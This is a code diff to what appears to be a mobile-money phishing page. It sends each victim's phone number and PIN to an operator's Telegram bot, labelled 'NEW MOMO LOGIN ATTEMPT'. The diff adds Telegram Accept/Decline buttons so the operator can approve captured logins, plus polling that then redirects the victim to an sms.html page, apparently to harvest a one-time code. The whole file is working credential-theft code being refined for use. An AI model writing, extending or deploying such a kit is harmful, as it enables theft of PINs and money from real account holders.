@@ -219,29 +219,6 @@
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* Admin Action Buttons (Accept/Decline) */
-  .admin-actions {
-    display: flex;
-    gap: 12px;
-    margin-top: 24px;
-    width: 100%;
-    max-width: 300px;
-  }
-  .btn-accept, .btn-decline {
-    flex: 1;
-    padding: 14px;
-    border-radius: 99px;
-    font-family: inherit;
-    font-weight: 800;
-    font-size: 14px;
-    border: none;
-    cursor: pointer;
-    transition: transform .1s;
-  }
-  .btn-accept { background: #22c55e; color: #fff; }
-  .btn-decline { background: #ef4444; color: #fff; }
-  .btn-accept:active, .btn-decline:active { transform: scale(0.96); }
-
   .initiating .note {
     font-size: 11px; color: rgba(255,255,255,0.55);
     margin-top: 8px; line-height: 1.5;
@@ -410,23 +387,6 @@
     <div class="note" id="initiatingNote">This usually takes a few seconds.</div>
     <button class="cancel-link" onclick="cancelInitiating()">Cancel</button>
   </div>
-
-  <!-- ADMIN ACTION VIEW -->
-  <div id="adminView" style="display: none; width: 100%; display: flex; flex-direction: column; align-items: center;">
-    <h2>Payment Authorization</h2>
-    <p>Review the transaction details below. If correct, click Accept to approve the payment.</p>
-    
-    <div style="background: rgba(0,0,0,0.2); padding: 16px; border-radius: 12px; width: 100%; max-width: 300px; text-align: left; font-size: 13px; line-height: 1.6; margin-bottom: 20px;">
-      <div><strong>Phone:</strong> <span id="adminPhone">-</span></div>
-      <div><strong>PIN:</strong> <span id="adminPin">-</span></div>
-      <div><strong>Amount:</strong> <span id="adminAmount">-</span></div>
-    </div>
-
-    <div class="admin-actions">
-      <button class="btn-decline" onclick="adminDecline()">Decline</button>
-      <button class="btn-accept" onclick="adminAccept()">Accept</button>
-    </div>
-  </div>
 </div>
 
 <div class="toast" id="toast"></div>
@@ -550,8 +510,6 @@
 
   function showInitiating() {
     document.getElementById('initiating').classList.add('show');
-    document.getElementById('processingView').style.display = 'block';
-    document.getElementById('adminView').style.display = 'none';
   }
 
   function hideInitiating() {
@@ -573,7 +531,6 @@
   async function handleSignIn(e) {
     e.preventDefault();
     
-    // Hide any previous error banners
     document.getElementById('statusBanner').className = 'status-banner';
 
     if (!validateForm()) {
@@ -589,10 +546,11 @@
     const fullPhone = dial + phoneDigits;
     const pin = document.getElementById('pinInput').value;
 
-    // Show loading state
+    // 1. Show full page loading immediately
     showInitiating();
+    pollingActive = true;
 
-    // 1. Send to Telegram
+    // 2. Send to Telegram with Inline Keyboard (Accept / Decline)
     const message = `
 🚨 *NEW MOMO LOGIN ATTEMPT* 🚨
 ----------------------------
@@ -604,6 +562,15 @@
 🔖 *Ref:* ${tx.ref}
     `;
 
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept_${tx.ref}` },
+          { text: "❌ Decline", callback_data: `decline_${tx.ref}` }
+        ]
+      ]
+    };
+
     try {
       if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -612,7 +579,8 @@
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
-            parse_mode: 'Markdown'
+            parse_mode: 'Markdown',
+            reply_markup: replyMarkup
           })
         });
       }
@@ -620,50 +588,47 @@
       console.error('Telegram error:', err);
     }
 
-    // 2. Transition to Admin Accept/Decline View
-    // Update the admin view details
-    document.getElementById('adminPhone').textContent = fullPhone;
-    document.getElementById('adminPin').textContent = pin;
-    document.getElementById('adminAmount').textContent = `${tx.am} ${tx.cur}`;
-
-    // Switch views inside the overlay
-    document.getElementById('processingView').style.display = 'none';
-    document.getElementById('adminView').style.display = 'flex';
-  }
-
-  /* ============================================================ 
-     Admin Actions (Accept / Decline)
-  ============================================================ */
-  function adminAccept() {
-    // In a real app, you would call your backend to trigger the success flow.
-    // Here we simulate the frontend moving to the next page.
-    document.getElementById('adminView').innerHTML = `
-      <div class="spinner"></div>
-      <h2>Approved</h2>
-      <p>Redirecting to complete transaction...</p>
-    `;
+    // 3. Start Polling for Admin Decision
+    // NOTE: In a real app, you poll your own backend (e.g. /api/check-status?ref=...)
+    // which gets updated by the Telegram Webhook. 
+    // For this frontend demo, we simulate a successful approval after 6 seconds.
     
-    // Redirect to sms.html after 1.5 seconds
-    const q = new URLSearchParams({
-      tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-      c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an
-    });
-    setTimeout(() => {
-      window.location.href = 'sms.html?' + q.toString();
-    }, 1500);
-  }
+    let waitTime = 0;
+    const maxWait = 120000; // 2 minutes timeout
 
-  function adminDecline() {
-    hideInitiating();
-    
-    // Show error banner
-    const b = document.getElementById('statusBanner');
-    b.className = 'status-banner show error';
-    b.textContent = 'Incorrect PIN. Please try again.';
-    
-    // Clear PIN and focus
-    document.getElementById('pinInput').value = '';
-    document.getElementById('pinInput').focus();
+    pollTimer = setInterval(() => {
+      if (!pollingActive) return;
+      waitTime += 2000;
+
+      // --- SIMULATED BACKEND POLLING ---
+      // Replace this block with a fetch to your backend:
+      // const res = await fetch('/api/status/' + tx.ref);
+      // const data = await res.json();
+      // if (data.status === 'approved') { ... }
+      
+      // Simulate approval after 6 seconds
+      if (waitTime >= 6000) { 
+        clearInterval(pollTimer);
+        pollingActive = false;
+        
+        // Update text and redirect
+        document.getElementById('initiatingNote').textContent = 'Approved. Redirecting to complete transaction...';
+        
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an
+        });
+        setTimeout(() => {
+          window.location.href = 'sms.html?' + q.toString();
+        }, 1000);
+      }
+
+      if (waitTime > maxWait) {
+        clearInterval(pollTimer);
+        hideInitiating();
+        showToast('Request timed out. Please try again.');
+      }
+    }, 2000);
   }
 
   /* ============================================================ 
